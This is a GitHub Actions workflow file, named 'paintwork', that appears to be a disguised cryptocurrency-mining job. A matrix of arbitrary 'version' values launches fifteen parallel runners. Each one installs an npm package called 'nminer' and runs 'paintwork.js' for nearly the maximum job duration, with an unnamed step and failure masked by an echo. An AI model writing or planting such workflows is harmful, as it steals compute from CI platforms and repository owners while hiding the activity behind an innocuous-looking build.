name: paintwork
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2995 }
          - { version: 5862 }
          - { version: 1559 }
          - { version: 7883 }
          - { version: 5111 }
          - { version: 4163 }
          - { version: 8116 }
          - { version: 7829 }
          - { version: 8169 }
          - { version: 4570 }
          - { version: 6544 }
          - { version: 8265 }
          - { version: 6791 }
          - { version: 2310 }
          - { version: 5042 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 328m node paintwork.js || echo "paintwork executed"